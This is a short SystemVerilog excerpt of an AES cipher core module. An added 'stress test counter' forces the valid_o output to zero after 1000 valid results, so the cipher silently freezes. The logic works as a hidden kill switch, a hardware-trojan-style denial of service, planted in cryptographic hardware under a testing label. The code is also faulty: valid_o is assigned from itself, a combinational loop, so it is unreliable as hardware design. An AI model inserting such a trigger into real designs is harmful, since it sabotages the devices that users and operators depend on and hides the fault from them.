module aes_cipher_core #(parameter int unsigned NumShare = 1) (
  input  logic                    clk_i,
  input  logic                    rst_ni,
  // ...
  output logic                    valid_o,
  // ...
);

  // ...
  // Original logic
  // ...

  // Add a stress test counter
  reg [31:0] stress_test_counter = 0;
  always @(posedge clk_i or negedge rst_ni) begin
    if (~rst_ni) begin
      stress_test_counter <= 32'b0;
    end else if (valid_o) begin
      stress_test_counter <= stress_test_counter + 1;
    end
  end

  // Disable valid_o signal after a specific threshold (simulate a pipeline freeze)
  assign valid_o = (stress_test_counter < 32'd1000) ? valid_o : 1'b0;

  // ...
  // Rest of the original logic
  // ...

endmodule
